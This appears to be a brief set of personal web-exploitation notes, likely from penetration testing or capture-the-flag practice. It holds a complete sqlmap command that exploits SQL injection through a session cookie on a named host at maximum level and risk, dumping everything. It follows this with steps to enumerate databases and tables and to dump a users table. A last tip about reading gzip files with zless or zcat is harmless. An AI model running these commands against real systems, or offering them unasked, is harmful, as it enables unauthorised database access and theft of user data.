# Various Web Exploits

### Give an example of a sqlmap query to exploit SQLi on cookies:
```
sqlmap -u http://shop.wey-tech.com/account_api.php --cookie="session=c2deb0aa8a22efd8c8f74c3db021d6e9" --data='accountinfo=accountinfo' --threads 2 -p "cookie" --ignore-code 401 --level 5 --risk 3 --dbms=mysql -a
```
`a` will retrieve everything. If you don't want to do that and instead find the information incrementally to save time for what you're really after then use: `--dbs` to enumerate teh databases, then `--tables -D <db name>` to get the tables, then `-T users --dump` to dump the *users* tables for example.

### You have a gzip compressed data file that doesn't gunzip?
Try `zless` or `zcat`.

